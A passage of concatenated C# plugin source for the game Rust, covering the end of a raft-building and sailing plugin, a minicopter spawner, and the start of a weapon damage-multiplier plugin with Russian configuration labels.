                stash?.Spawn();
                stash.SetParent(entity);
            }

            void SpawnLock()
            {
                string copterlockprefab = "assets/prefabs/locks/keypad/lock.code.prefab";

                boatlock = GameManager.server.CreateEntity(copterlockprefab, entitypos, entityrot, true);
                boatlock.transform.localEulerAngles = new Vector3(0, 90, 90);
                boatlock.transform.localPosition = new Vector3(0.5f, 0f, 0f);
                boatlock.OwnerID = ownerid;
                boatlock?.Spawn();
                boatlock.SetParent(entity, 0);
            }

            public void SpawnSail()
            {
                string prefabdoor = "assets/prefabs/building/wall.frame.garagedoor/wall.frame.garagedoor.prefab";
                string prefabmast = "assets/prefabs/deployable/signs/sign.post.single.prefab";
                door = GameManager.server.CreateEntity(prefabdoor, entitypos, entityrot, true);
                door.transform.localEulerAngles = new Vector3(90, -90, 0);
                door.transform.localPosition = new Vector3(1.3f, 3.6f, 0.6f);
                var doorstab = door.GetComponent<StabilityEntity>();
                doorstab.grounded = true;
                door.skinID = 1199376910;
                door.OwnerID = ownerid;
                door?.Spawn();
                door.SetParent(entity);
                door.SetFlag(BaseEntity.Flags.Open, true, true);

                door2 = GameManager.server.CreateEntity(prefabdoor, entitypos, entityrot, true);
                door2.transform.localEulerAngles = new Vector3(90, -90, 0);
                door2.transform.localPosition = new Vector3(1.3f, 1.2f, 0.6f);
                var door2stab = door2.GetComponent<StabilityEntity>();
                door2stab.grounded = true;
                door2.skinID = 1199376910;
                door2.OwnerID = ownerid;
                door2?.Spawn();
                door2.SetParent(entity);
                door2.SetFlag(BaseEntity.Flags.Open, true, true);
                door2.SetFlag(BaseEntity.Flags.Locked, true, true);
                hassail = true;
            }

            void SpawnRaft()
            {
                string prefabfloor = "assets/prefabs/deployable/signs/sign.huge.wood.prefab";
                string prefabbarrel = "assets/bundled/prefabs/radtown/oil_barrel.prefab";
                string prefabrudder = "assets/prefabs/deployable/signs/sign.post.single.prefab";

                floor1 = GameManager.server.CreateEntity(prefabfloor, entitypos, entityrot, true);
                floor1.transform.localEulerAngles = new Vector3(-90, 90, 0);
                floor1.transform.localPosition = new Vector3(0f, 0f, 0f);
                var floor1stab = floor1.GetComponent<StabilityEntity>();
                if (floor1stab) floor1stab.grounded = true;
                floor1.OwnerID = ownerid;
                floor1?.Spawn();
                floor1.SetParent(entity);

                floor2 = GameManager.server.CreateEntity(prefabfloor, entitypos, entityrot, true);
                floor2.transform.localEulerAngles = new Vector3(-90, 90, 0);
                floor2.transform.localPosition = new Vector3(2f, 0f, 0f);
                var floor2stab = floor2.GetComponent<StabilityEntity>();
                if (floor2stab) floor2stab.grounded = true;
                floor2.OwnerID = ownerid;
                floor2?.Spawn();
                floor2.SetParent(entity);

                rudder = GameManager.server.CreateEntity(prefabrudder, entitypos, entityrot, true);
                rudder.transform.localEulerAngles = new Vector3(0, 270, 130);
                rudder.transform.localPosition = new Vector3(0f, 0.7f, -1.7f);
                var rudderstab = rudder.GetComponent<StabilityEntity>();
                if (rudderstab) rudderstab.grounded = true;
                rudder.skinID = 1;
                rudder.OwnerID = ownerid;
                rudder?.Spawn();
                rudder.SetParent(entity);
                rudder.SetFlag(BaseEntity.Flags.Busy, true, true);

                barrel1 = GameManager.server.CreateEntity(prefabbarrel, entitypos, entityrot, true);
                barrel1.transform.localEulerAngles = new Vector3(-90, 0, 0);
                barrel1.transform.localPosition = new Vector3(-1.8f, -0.4f, -1.5f);
                var barrel1stab = barrel1.GetComponent<StabilityEntity>();
                if (barrel1stab) barrel1stab.grounded = true;
                barrel1.OwnerID = ownerid;
                barrel1?.Spawn();
                barrel1.SetParent(entity);

                barrel2 = GameManager.server.CreateEntity(prefabbarrel, entitypos, entityrot, true);
                barrel2.transform.localEulerAngles = new Vector3(-90, 0, 0);
                barrel2.transform.localPosition = new Vector3(-1.8f, -0.4f, 0.5f);
                var barrel2stab = barrel2.GetComponent<StabilityEntity>();
                if (barrel2stab) barrel2stab.grounded = true;
                barrel2.OwnerID = ownerid;
                barrel2?.Spawn();
                barrel2.SetParent(entity);

                barrel3 = GameManager.server.CreateEntity(prefabbarrel, entitypos, entityrot, true);
                barrel3.transform.localEulerAngles = new Vector3(-90, 0, 0);
                barrel3.transform.localPosition = new Vector3(-1.8f, -0.4f, 2.5f);
                var barrel3stab = barrel3.GetComponent<StabilityEntity>();
                if (barrel3stab) barrel3stab.grounded = true;
                barrel3.OwnerID = ownerid;
                barrel3?.Spawn();
                barrel3.SetParent(entity);

                barrel4 = GameManager.server.CreateEntity(prefabbarrel, entitypos, entityrot, true);
                barrel4.transform.localEulerAngles = new Vector3(-90, 0, 0);
                barrel4.transform.localPosition = new Vector3(1.8f, -0.4f, -1.5f);
                var barrel4stab = barrel4.GetComponent<StabilityEntity>();
                if (barrel4stab) barrel4stab.grounded = true;
                barrel4.OwnerID = ownerid;
                barrel4?.Spawn();
                barrel4.SetParent(entity);

                barrel5 = GameManager.server.CreateEntity(prefabbarrel, entitypos, entityrot, true);
                barrel5.transform.localEulerAngles = new Vector3(-90, 0, 0);
                barrel5.transform.localPosition = new Vector3(1.8f, -0.4f, 0.5f);
                var barrel5stab = barrel5.GetComponent<StabilityEntity>();
                if (barrel5stab) barrel5stab.grounded = true;
                barrel5.OwnerID = ownerid;
                barrel5?.Spawn();
                barrel5.SetParent(entity);

                barrel6 = GameManager.server.CreateEntity(prefabbarrel, entitypos, entityrot, true);
                barrel6.transform.localEulerAngles = new Vector3(-90, 0, 0);
                barrel6.transform.localPosition = new Vector3(1.8f, -0.4f, 2.5f);
                var barrel6stab = barrel6.GetComponent<StabilityEntity>();
                if (barrel6stab) barrel6stab.grounded = true;
                barrel6.OwnerID = ownerid;
                barrel6?.Spawn();
                barrel6.SetParent(entity);

            }

            public void SpawnPassengerChairs()
            {
                string prefabchair = "assets/prefabs/deployable/chair/chair.deployed.prefab";
                chairbackright = GameManager.server.CreateEntity(prefabchair, entitypos, entityrot, true);
                chairbackright.transform.localEulerAngles = new Vector3(0, 0, 0);
                chairbackright.transform.localPosition = new Vector3(0.9f, 0f, -2);
                var rmount = chairbackright.GetComponent<BaseMountable>();
                rmount.isMobile = true;
                chairbackright.OwnerID = ownerid;
                chairbackright?.Spawn();
                chairbackright.SetParent(entity);

                chairbackleft = GameManager.server.CreateEntity(prefabchair, entitypos, entityrot, true);
                chairbackleft.transform.localEulerAngles = new Vector3(0, 0, 0);
                chairbackleft.transform.localPosition = new Vector3(-0.9f, 0f, -2);
                var lmount = chairbackleft.GetComponent<BaseMountable>();
                lmount.isMobile = true;
                chairbackleft.OwnerID = ownerid;
                chairbackleft?.Spawn();
                chairbackleft.SetParent(entity);
                haschairs = true;
            }

            public void SpawnNet()
            {
                string prefabnet = "assets/prefabs/building/wall.frame.netting/wall.frame.netting.prefab";
                net1 = GameManager.server.CreateEntity(prefabnet, entitypos, entityrot, false);
                net1.transform.localEulerAngles = new Vector3(0, 0, 17);
                net1.transform.localPosition = new Vector3(2.4f, -0.9f, -1f);
                var netstab1 = net1.GetComponent<StabilityEntity>();
                netstab1.grounded = true;
                net1.OwnerID = ownerid;
                net1?.Spawn();
                net1.SetParent(entity);
                hasnet = true;
            }

            public void SpawnCampfire()
            {
                string prefabfire = "assets/prefabs/deployable/campfire/campfire.prefab";
                fire = GameManager.server.CreateEntity(prefabfire, entitypos, entityrot, true) as BaseOven;
                fire.transform.localEulerAngles = new Vector3(0, 180, 0);
                fire.transform.localPosition = new Vector3(1.5f, 0f, 2f);
                fire.OwnerID = ownerid;
                fire?.Spawn();
                fire.SetParent(entity);
                fire.SetFlag(BaseEntity.Flags.On, false, true);

                string prefablantern = "assets/prefabs/deployable/lantern/lantern.deployed.prefab";
                lantern = GameManager.server.CreateEntity(prefablantern, entitypos, entityrot, true) as BaseOven;
                lantern.transform.localEulerAngles = new Vector3(0, 180, 0);
                lantern.transform.localPosition = new Vector3(0f, 0f, 2.4f);
                lantern.OwnerID = ownerid;
                lantern?.Spawn();
                lantern.SetParent(entity);
                hasfire = true;
            }

            public void SpawnSideWalls()
            {
                string prefabtop = "assets/prefabs/deployable/signs/sign.large.wood.prefab";
                backtop = GameManager.server.CreateEntity(prefabtop, entitypos, entityrot, true);
                backtop.transform.localEulerAngles = new Vector3(0, 180, 0);
                backtop.transform.localPosition = new Vector3(0f, 0f, -2.4f);
                backtop.skinID = 1;
                backtop.OwnerID = ownerid;
                backtop?.Spawn();
                backtop.SetParent(entity);

                backside1 = GameManager.server.CreateEntity(prefabtop, entitypos, entityrot, true);
                backside1.transform.localEulerAngles = new Vector3(0, 90, 0);
                backside1.transform.localPosition = new Vector3(1.55f, 0f, -1f);
                backside1.OwnerID = ownerid;
                backside1?.Spawn();
                backside1.SetParent(entity);

                backside2 = GameManager.server.CreateEntity(prefabtop, entitypos, entityrot, true);
                backside2.transform.localEulerAngles = new Vector3(0, 270, 0);
                backside2.transform.localPosition = new Vector3(-1.55f, 0f, -1f);
                backside2.OwnerID = ownerid;
                backside2?.Spawn();
                backside2.SetParent(entity);
                haswalls = true;
            }

            public void SpawnRoof()
            {
                string prefabrudder = "assets/prefabs/deployable/signs/sign.post.single.prefab";
                string prefabtop = "assets/prefabs/deployable/signs/sign.large.wood.prefab";
                pole1 = GameManager.server.CreateEntity(prefabrudder, entitypos, entityrot, true);
                pole1.transform.localEulerAngles = new Vector3(0, 90, 180);
                pole1.transform.localPosition = new Vector3(1.5f, 2.3f, 0f);
                pole1.OwnerID = ownerid;
                pole1?.Spawn();
                pole1.SetParent(entity);
                pole1.SetFlag(BaseEntity.Flags.Busy, true, true);

                pole2 = GameManager.server.CreateEntity(prefabrudder, entitypos, entityrot, true);
                pole2.transform.localEulerAngles = new Vector3(0, 90, 180);
                pole2.transform.localPosition = new Vector3(-1.5f, 2.3f, 0f);
                pole2.OwnerID = ownerid;
                pole2?.Spawn();
                pole2.SetParent(entity);
                pole2.SetFlag(BaseEntity.Flags.Busy, true, true);

                pole3 = GameManager.server.CreateEntity(prefabrudder, entitypos, entityrot, true);
                pole3.transform.localEulerAngles = new Vector3(0, 90, 180);
                pole3.transform.localPosition = new Vector3(1.5f, 2.3f, -1.5f);
                pole3.OwnerID = ownerid;
                pole3?.Spawn();
                pole3.SetParent(entity);
                pole3.SetFlag(BaseEntity.Flags.Busy, true, true);

                pole4 = GameManager.server.CreateEntity(prefabrudder, entitypos, entityrot, true);
                pole4.transform.localEulerAngles = new Vector3(0, 90, 180);
                pole4.transform.localPosition = new Vector3(-1.5f, 2.3f, -1.5f);
                pole4.OwnerID = ownerid;
                pole4?.Spawn();
                pole4.SetParent(entity);
                pole4.SetFlag(BaseEntity.Flags.Busy, true, true);

                roof1 = GameManager.server.CreateEntity(prefabtop, entitypos, entityrot, true);
                roof1.transform.localEulerAngles = new Vector3(-90, 0, 0);
                roof1.transform.localPosition = new Vector3(0f, 2.2f, 0.5f);
                roof1.OwnerID = ownerid;
                roof1?.Spawn();
                roof1.SetParent(entity);

                roof2 = GameManager.server.CreateEntity(prefabtop, entitypos, entityrot, true);
                roof2.transform.localEulerAngles = new Vector3(-90, 0, 0);
                roof2.transform.localPosition = new Vector3(0f, 2.2f, -1f);
                roof2.OwnerID = ownerid;
                roof2?.Spawn();
                roof2.SetParent(entity);
                hasroof = true;
            }

            bool hitSomething(Vector3 position)
            {
                var directioncheck = new Vector3();
                if (moveforward || setsail) directioncheck = position + (transform.forward * 2);
                if (movebackward) directioncheck = position - (transform.forward * 2);
                if (GamePhysics.CheckSphere(directioncheck, 1f, buildinglayer, 0)) return true;
                return false;
            }

            bool isStillInWater(Vector3 position)
            {
                var waterdepth = (TerrainMeta.WaterMap.GetHeight(position) - TerrainMeta.HeightMap.GetHeight(position));
                if (waterdepth >= 0.5f) return true;
                return false;
            }

            bool PlayerIsMounted()
            {
                bool flag = entity.GetComponent<BaseMountable>().IsMounted();
                return flag;

            }

            public void ToggleStash()
            {
                var stashcontainer = stash.GetComponent<StashContainer>() ?? null;
                if (stashcontainer != null && stashcontainer.IsHidden()) { stashcontainer.SetHidden(false); return; }
                if (stashcontainer != null) stashcontainer.SetHidden(true);
            }

            public void UnfurlTheSails()
            {
                door.SetFlag(BaseEntity.Flags.Open, false, false);
                setsail = true;
                if (door != null) door.transform.hasChanged = true;
                if (door != null) door.SendNetworkUpdateImmediate();
                if (door != null) door.UpdateNetworkGroup();
            }

            public void FurlTheSails()
            {
                door.SetFlag(BaseEntity.Flags.Open, true, true);
                setsail = false;
                if (door != null) door.transform.hasChanged = true;
                if (door != null) door.SendNetworkUpdateImmediate();
                if (door != null) door.UpdateNetworkGroup();
            }

            void SplashEffect()
            {
                Effect.server.Run("assets/bundled/prefabs/fx/water/midair_splash.prefab", barrel1.transform.position);
                Effect.server.Run("assets/bundled/prefabs/fx/water/midair_splash.prefab", barrel4.transform.position);
            }

            void SpawnRandomLoot()
            {
                if (!RandomOceanLootSpawn || !lootready) return;
                counter = counter + 1;
                if (counter >= RandomLootTick)
                {
                    int roll = UnityEngine.Random.Range(0, 100);
                    if (roll < RandomLootChance)
                    {
                        var randomlootprefab = "assets/bundled/prefabs/radtown/crate_basic.prefab";
                        int rlroll = UnityEngine.Random.Range(1, 6);
                        if (rlroll == 1) randomlootprefab = LootOption1;
                        if (rlroll == 2) randomlootprefab = LootOption2;
                        if (rlroll == 3) randomlootprefab = LootOption3;
                        if (rlroll == 4) randomlootprefab = LootOption4;
                        if (rlroll == 5) randomlootprefab = LootOption5;

                        var spawnpos = GetSpawnLocation();
                        lootbarrel = GameManager.server.CreateEntity(randomlootprefab, spawnpos, Quaternion.identity, true);
                        lootbarrel?.Spawn();
                        lootready = false;
                        raft.timer.Once(100f, () => ResetLootSpawn(lootbarrel));
                        counter = 0;
                    }
                    counter = 0;
                }
            }

            void ResetLootSpawn(BaseEntity lootbarrel)
            {
                lootready = true;
                if (lootbarrel != null) lootbarrel.Invoke("KillMessage", 0.1f);
            }

            Vector3 GetSpawnLocation()
            {
                var currentpos = entity.transform.position;
                Vector3 randomizer = new Vector3(UnityEngine.Random.Range(-40f, 40f), 0f, UnityEngine.Random.Range(-40f, 40f));
                Vector3 newp = (currentpos + (transform.forward * 40f)) + randomizer;
                var spawnPos = new Vector3(newp.x, currentpos.y + -0.5f, newp.z);
                return spawnPos;
            }

            void FixedUpdate()
            {
                if (!ismoving && !(setsail || moveforward || movebackward || rotright || rotleft)) return;
                if (!PlayerIsMounted()) { ResetMovement(); RefreshAll(); ismoving = false; return; }
                var currentloc = entity.transform.position;
                waterheight = TerrainMeta.WaterMap.GetHeight(currentloc);
                startloc = new Vector3(currentloc.x, waterheight + 0.4f, currentloc.z);
                startrot = entity.transform.eulerAngles;

                if (rotright) rotdirection = new Vector3(startrot.x, startrot.y + 1, startrot.z);
                if (rotleft) rotdirection = new Vector3(startrot.x, startrot.y - 1, startrot.z);

                if (setsail) endloc = startloc + (transform.forward * sailsteps) * Time.deltaTime;
                else if (moveforward) endloc = startloc + (transform.forward * steps) * Time.deltaTime;
                else if (movebackward) endloc = startloc + (transform.forward * -steps) * Time.deltaTime;

                if (hitSomething(endloc)) { endloc = startloc; ResetMovement(); RefreshAll(); return; }
                if (!isStillInWater(endloc)) { endloc = startloc; ResetMovement(); RefreshAll(); return; }
                if (endloc.x >= 3900 || endloc.x <= -3900 || endloc.z >= 3900 || endloc.z <= -3900) { endloc = startloc; ResetMovement(); RefreshAll(); return; }
                if (endloc.x >= 2000 || endloc.x <= -2000 || endloc.z >= 2000 || endloc.z <= -2000) SpawnRandomLoot();

                if (ShowWaterSplash) SplashEffect();

                if (endloc == new Vector3(0f, 0f, 0f)) endloc = startloc;
                entity.transform.eulerAngles = rotdirection;
                entity.transform.localPosition = endloc;
                RefreshAll();
            }

            void ResetMovement()
            {
                moveforward = false;
                movebackward = false;
                rotright = false;
                rotleft = false;
                setsail = false;
            }

            void RefreshAll()
            {
                if (entity == null) return;
                if (entity != null)
                {
                    entity.transform.hasChanged = true;
                    var entitymount = entity.GetComponent<BaseMountable>() ?? null;
                    if (entitymount != null)
                    {
                        entitymount.isMobile = true;
                    }
                    entity.SendNetworkUpdateImmediate();
                    entity.UpdateNetworkGroup();
                    entity.GetComponent<DestroyOnGroundMissing>().enabled = false;
                    entity.GetComponent<GroundWatch>().enabled = false;

                    if (entity.children != null)
                        for (int i = 0; i < entity.children.Count; i++)
                        {
                            entity.children[i].transform.hasChanged = true;
                            var hasmount = entity.children[i].GetComponent<BaseMountable>() ?? null;
                            if (hasmount != null)
                            {
                                hasmount.isMobile = true;
                            }
                            entity.children[i].SendNetworkUpdateImmediate();
                            entity.children[i].UpdateNetworkGroup();
                        }
                }
            }

            public void OnDestroy()
            {
                if (hasRaft.ContainsKey(ownerid)) hasRaft.Remove(ownerid);
                if (lootbarrel != null && !lootbarrel.IsDestroyed) { lootbarrel.Invoke("KillMessage", 0.1f); }
                if (entity != null && !entity.IsDestroyed) { entity.Invoke("KillMessage", 0.1f); }
            }
        }

        #endregion

        #region Configuration

        static float DefaultRaftMovementSpeed = 4f;
        static float DefaultRaftSailingSpeed = 4f;
        static bool DisableRaftStash = false;
        static bool SpawnFullyBuilt = false;
        static bool OnlyOneActiveRaft = true;
        static bool ShowWaterSplash = false;

        static bool RandomOceanLootSpawn = true;
        static int RandomLootChance = 50;
        static int RandomLootTick = 100;
        static string LootOption1 = "assets/bundled/prefabs/radtown/crate_basic.prefab";
        static string LootOption2 = "assets/bundled/prefabs/radtown/crate_elite.prefab";
        static string LootOption3 = "assets/bundled/prefabs/radtown/crate_mine.prefab";
        static string LootOption4 = "assets/bundled/prefabs/radtown/crate_normal.prefab";
        static string LootOption5 = "assets/bundled/prefabs/radtown/crate_normal_2.prefab";

        static int MaterialsForRoof = 2000;
        static int MaterialsForWalls = 2000;
        static int MaterialsForRaft = 5000;
        static int MaterialsForSail = 3000;
        static int MaterialsForCampfire = 100;
        static int MaterialsForNet = 3;
        static int MaterialsForChairs = 2;
        static int RefundForScrap = 5000;

        bool Changed;

        bool isRestricted;
        private void LoadVariables()
        {
            LoadConfigVariables();
            SaveConfig();
        }

        void LoadDefaultConfig()
        {
            Puts("Creating a new config file");
            Config.Clear();
            LoadVariables();
        }

        private void LoadConfigVariables()
        {
            CheckCfg("Spawn - Always Spawn fully built rafts ? ", ref SpawnFullyBuilt);
            CheckCfg("Stash - Disable Stash on Rafts ? ", ref DisableRaftStash);
            CheckCfg("Usage - Only 1 Active Raft per player ? ", ref OnlyOneActiveRaft);
            CheckCfg("Effect - Show water splash effect when moving ? ", ref ShowWaterSplash);

            CheckCfg("Loot - Toggle Random Deep Ocean Loot Spawns (Past 2000 X or Z coords): ", ref RandomOceanLootSpawn);
            CheckCfg("Loot - Percent Chance Random Deep Ocean Loot will spawn (if enabled) : ", ref RandomLootChance);
            CheckCfg("Loot - Tick rate to check if Random Ocean Loot will spawn : ", ref RandomLootTick);
            CheckCfg("Loot - Loot Option 1 prefab : ", ref LootOption1);
            CheckCfg("Loot - Loot Option 2 prefab : ", ref LootOption2);
            CheckCfg("Loot - Loot Option 3 prefab : ", ref LootOption3);
            CheckCfg("Loot - Loot Option 4 prefab : ", ref LootOption4);
            CheckCfg("Loot - Loot Option 5 prefab : ", ref LootOption5);

            CheckCfg("Materials - Roof - Amount of Wood needed to build : ", ref MaterialsForRoof);
            CheckCfg("Materials - Walls - Amount of Wood needed to build : ", ref MaterialsForWalls);
            CheckCfg("Materials - Raft- Amount of Wood needed to build : ", ref MaterialsForRaft);
            CheckCfg("Materials - Sail - Amount of Wood needed to build : ", ref MaterialsForSail);
            CheckCfg("Materials - Campfire - Amount of Wood needed to build : ", ref MaterialsForCampfire);
            CheckCfg("Materials - Net- Amount of Rope needed to build : ", ref MaterialsForNet);
            CheckCfg("Materials - Chairs - Amount of Chairs needed to build : ", ref MaterialsForChairs);
            CheckCfg("Scrap Refund - Amount of wood to refund player when using /raft.destroy : ", ref RefundForScrap);

            CheckCfgFloat("Speed - Default Raft Movement Speed : ", ref DefaultRaftMovementSpeed);
            CheckCfgFloat("Speed - Default Sail Mode Movement Speed : ", ref DefaultRaftSailingSpeed);
        }

        private void CheckCfg<T>(string Key, ref T var)
        {
            if (Config[Key] is T)
                var = (T)Config[Key];
            else
                Config[Key] = var;
        }

        private void CheckCfgFloat(string Key, ref float var)
        {

            if (Config[Key] != null)
                var = Convert.ToSingle(Config[Key]);
            else
                Config[Key] = var;
        }

        object GetConfig(string menu, string datavalue, object defaultValue)
        {
            var data = Config[menu] as Dictionary<string, object>;
            if (data == null)
            {
                data = new Dictionary<string, object>();
                Config[menu] = data;
                Changed = true;
            }
            object value;
            if (!data.TryGetValue(datavalue, out value))
            {
                value = defaultValue;
                data[datavalue] = value;
                Changed = true;
            }
            return value;
        }

        #endregion

        #region Localization

        string msg(string key, string playerId = null) => lang.GetMessage(key, this, playerId);

        Dictionary<string, string> Messages = new Dictionary<string, string>
        {
            ["notauthorized"] = "You are not authorized to use that command !!",
            ["notowner"] = "You must be owner of boat to pilot it !!!",
            ["hasraftalready"] = "You already have a raft in the world !!!",
            ["captain"] = "You are now the Captain of this boat !!!",
            ["setsail"] = "Your sails are unfurled, now your sailing !!!",
            ["alreadyadded"] = "That part is already installed !!!",
            ["missingmaterials"] = "You are missing the required materials to uprade to that !! ",
            ["nonet"] = "You need a roof installed before you can add a Net !!! ",
            ["endofworld"] = "Movement blocked !!! You are at the end of the playable world !!!",
            ["notstandingwater"] = "You must be in deeper water but NOT swimming to build a raft !!"
        };

        #endregion

    }
}

// --- End of file: Raft.cs ---
// --- Next file ---

// --- GitHub Source URL: https://github.com/RustyyTown/plugins/blob/main/CopterSpawns.cs ---
// --- Original Local Path: CopterSpawns.cs ---

﻿using Facepunch;
using Rust;
using System.Collections.Generic;
using System.Linq;
using UnityEngine;
using System;
namespace Oxide.Plugins
{
    [Info("CopterSpawns", "OxideBro", "0.0.1")]
    public class CopterSpawns : RustPlugin
    {
        #region Oxide
        string copter = "assets/content/vehicles/minicopter/minicopter.entity.prefab";

        private void OnServerInitialized()
        {
            if (ConVar.Server.level == "Barren")
            {
                PrintWarning($"Server size map: {TerrainMeta.Size.x}, Minicopter population {MiniCopter.population}, Loaded {UnityEngine.Object.FindObjectsOfType<MiniCopter>().Count()} MiniCopters");
                StartSpawn();
            }
        }

        void OnEntityKill(BaseNetworkable entity)
        {
            if (entity == null || entity?.net?.ID == null) return;
            try
            {
                if (entity is MiniCopter) NextTick(() => StartSpawn());
            }
            catch (NullReferenceException) { }
        }
        #endregion

        #region Spawn
        void StartSpawn()
        {
            var ents = UnityEngine.Object.FindObjectsOfType<MiniCopter>();
            if (ents != null)
            {
                var entcount = ents.Count();
                var count = MiniCopter.population * TerrainMeta.Size.x / 1000;
                if (count - entcount > 0) PrintWarning($"At the moment we will create {count - entcount} minicopter");
                for (int i = 0; i < count - entcount; i++)
                {
                    Vector3 vector = GetEventPosition();


                    BaseEntity copter = GameManager.server.CreateEntity(this.copter, vector, new Quaternion(), true);
                    copter.enableSaving = true;
                    copter.Spawn();
                }
            }
        }

        SpawnFilter filter = new SpawnFilter();
        List<Vector3> monuments = new List<Vector3>();

        static float GetGroundPosition(Vector3 pos)
        {
            float y = TerrainMeta.HeightMap.GetHeight(pos);
            RaycastHit hit;
            if (Physics.Raycast(new Vector3(pos.x, pos.y + 200f, pos.z), Vector3.down, out hit, Mathf.Infinity, LayerMask.GetMask(new[] { "Terrain", "World", "Default", "Construction", "Deployed" })) && !hit.collider.name.Contains("rock_cliff"))
                return Mathf.Max(hit.point.y, y);
            return y;
        }

        public Vector3 RandomDropPosition()
        {
            var vector = Vector3.zero;
            float num = 1000f, x = TerrainMeta.Size.x / 5;

            do
            {
                vector = Vector3Ex.Range(-x, x);
            }
            while (filter.GetFactor(vector) == 0f && (num -= 1f) > 0f);
            float max = TerrainMeta.Size.x / 2;
            float height = TerrainMeta.HeightMap.GetHeight(vector);
            vector.y = height;
            return vector;
        }

        List<int> BlockedLayers = new List<int> { (int)Layer.Water, (int)Layer.Construction, (int)Layer.Trigger, (int)Layer.Prevent_Building, (int)Layer.Deployed, (int)Layer.Tree };
        static int blockedMask = LayerMask.GetMask(new[] { "Player (Server)", "Trigger", "Prevent Building" });

        public Vector3 GetSafeDropPosition(Vector3 position)
        {
            RaycastHit hit;
            position.y += 200f;

            if (Physics.Raycast(position, Vector3.down, out hit))
            {
                if (hit.collider?.gameObject == null)
                    return Vector3.zero;
                string ColName = hit.collider.name;

                if (!BlockedLayers.Contains(hit.collider.gameObject.layer) && ColName != "MeshColliderBatch" && ColName != "iceberg_3" && ColName != "iceberg_2" && !ColName.Contains("rock_cliff"))
                {
                    position.y = Mathf.Max(hit.point.y, TerrainMeta.HeightMap.GetHeight(position));
                    var colliders = Pool.GetList<Collider>();
                    Vis.Colliders(position, 1, colliders, blockedMask, QueryTriggerInteraction.Collide);
                    bool blocked = colliders.Count > 0;
                    Pool.FreeList<Collider>(ref colliders);
                    if (!blocked)
                        return position;
                }
            }
            return Vector3.zero;
        }

        public Vector3 GetEventPosition()
        {
            var eventPos = Vector3.zero;
            int maxRetries = 100;
            monuments = UnityEngine.Object.FindObjectsOfType<MonumentInfo>().Select(monument => monument.transform.position).ToList();
            do
            {
                eventPos = GetSafeDropPosition(RandomDropPosition());

                foreach (var monument in monuments)
                {
                    if (Vector3.Distance(eventPos, monument) < 150f)
                    {
                        eventPos = Vector3.zero;
                        break;
                    }
                }
            } while (eventPos == Vector3.zero && --maxRetries > 0);

            eventPos.y = GetGroundPosition(eventPos);

            if (eventPos.y < 0)
                GetEventPosition();
            return eventPos;
        }
        #endregion
    }
}

// --- End of file: CopterSpawns.cs ---
// --- Next file ---

// --- GitHub Source URL: https://github.com/RustyyTown/plugins/blob/main/kryIncreaseWeapons.cs ---
// --- Original Local Path: kryIncreaseWeapons.cs ---

using System.Linq;
using System.Collections.Generic;
using Newtonsoft.Json;

namespace Oxide.Plugins
{
    [Info("kryIncreaseWeapons", "xkrystalll", "1.0.2")]
    class kryIncreaseWeapons : RustPlugin
    {
        #region Configuration
        public static ConfigData cfg;
        public class ConfigData
        {
            [JsonProperty("Улучшенное оружие")]
            public Dictionary<string, WeaponsInfo> weapons = new Dictionary<string, WeaponsInfo>();
        }
        protected override void LoadDefaultConfig()
        {
            var config = new ConfigData()
            {
                weapons = 
                {
                    {"aktest", new WeaponsInfo("АК-47", 2323019876, 10f, 0f, "rifle.ak", true, false, true)},
                    {"lrtest", new WeaponsInfo("M4", 2319796265, 0.1f, 10f, "rifle.lr300", false, true, false)}
                }
            };
            SaveConfig(config);
        } 
        void LoadConfig() 
        {
            cfg = Config.ReadObject<ConfigData>();
            SaveConfig(cfg);
        }
        void SaveConfig(object config) => Config.WriteObject(config, true);
        #endregion

        #region Fields
        public List<WeaponsInfo> weaponsVal;
        public List<string> weaponsKeys;
        public class WeaponsInfo
        {
            public WeaponsInfo(string name, ulong skin, float dmulti, float cmulti, string shortname, bool maybeRepair, bool deleteOnBreak, bool entityMultiplier)
            {
                this.shortname = shortname;
                this.name = name;
                this.skin = skin;
                this.damageMultiplier = dmulti;
                this.conditionMultiplier = cmulti;
                this.deleteOnBreak = deleteOnBreak;
                this.maybeRepair = maybeRepair;
                this.entityMultiplier = entityMultiplier;
            }
            [JsonProperty("ShortName оружия")]
            public string shortname;
            [JsonProperty("Имя оружия")]
            public string name;
            [JsonProperty("Скин оружия")]
            public ulong skin;
            [JsonProperty("Множитель урона оружия")]
            public float damageMultiplier;
            [JsonProperty("Множитель ломания оружия")]
            public float conditionMultiplier;
            [JsonProperty("Можно ли починить?")]
            public bool maybeRepair;
            [JsonProperty("Удалять оружие при поломке?")]
            public bool deleteOnBreak;
            [JsonProperty("Умножать урон по строениям?")]
            public bool entityMultiplier;
        }
        #endregion
    
        #region Hooks
        object OnEntityTakeDamage(BaseCombatEntity entity, HitInfo info)
        {
            var p = info.InitiatorPlayer;
            if (p == null) { return null; }
            WeaponsInfo weapon;
            try { weapon = cfg.weapons.Values.ToList().First(x => info.Weapon.GetItem().name == x.name && x.skin == info.Weapon.skinID); } catch { return null; }
            if (!weapon.entityMultiplier)
            {
                if (entity.ToPlayer() == null || entity.IsNpc) { return null; }
            }
            if (entity.IsDead()) { return null; }
            info.damageTypes.ScaleAll(weapon.damageMultiplier); 
            return null;
        }

        object OnItemRepair(BasePlayer player, Item item)
        {
            if (item == null) return null;
            WeaponsInfo weapon;
            try{ weapon = weaponsVal.First(x => x.name == item.name && x.skin == item.skin); } catch { return null; }
            if (!weapon.maybeRepair) 
            {
                player.ChatMessage($"Вы <color=red>не можете</color> починить {item.name}!");
                return false;
            }
            return null;
        }
        private void ChangeItemSkin(Item item, ulong targetSkin)
        {           
            item.skin = targetSkin;
            item.MarkDirty();

            BaseEntity heldEntity = item.GetHeldEntity();
            if (heldEntity != null)
            {
                heldEntity.skinID = targetSkin;
                heldEntity.SendNetworkUpdate(BasePlayer.NetworkQueue.Update);
            }           
        }
        void OnLoseCondition(Item item, ref float amount)
        {
            if (item == null) { return; }
            WeaponsInfo weapon; 
            try { weapon = weaponsVal.First(x => x.name == item.name && x.skin == item.skin); } catch { return; }
            float ConditionBefore = item.condition;
            BasePlayer p = item.GetOwnerPlayer();

            NextTick(() => 
            {
                float ConditionAfter = item.condition;
                item.condition += 0.25f;
                float SetCondition = ((ConditionBefore - ConditionAfter) * weapon.conditionMultiplier);
                item.condition -= SetCondition;
                if (item.condition == 0 || item.isBroken) 
                {
                    if (weapon.deleteOnBreak) { item.UseItem(1); }
                    return;
                }
            });
            
        }
        void OnServerInitialized()
        {
            LoadConfig();
            weaponsVal = cfg.weapons.Values.ToList();
            weaponsKeys = cfg.weapons.Keys.ToList();
        }
        #endregion

        #region commands
        [ConsoleCommand("giveweapon")]
